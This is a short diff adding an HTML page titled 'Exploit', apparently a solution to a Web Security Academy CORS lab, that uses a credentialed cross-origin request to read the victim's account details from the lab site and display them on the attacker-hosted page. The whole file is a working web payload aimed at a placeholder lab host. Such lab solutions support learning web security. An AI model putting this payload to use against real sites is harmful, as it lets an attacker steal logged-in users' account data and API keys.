@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Exploit</h1>
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = function() {
+        // Affiche la clé sur la page GitHub Pages
+        document.body.innerHTML += "<pre>" + this.responseText + "</pre>";
+    };
+    req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+    req.send();
+</script>
+
+</body>
+</html>
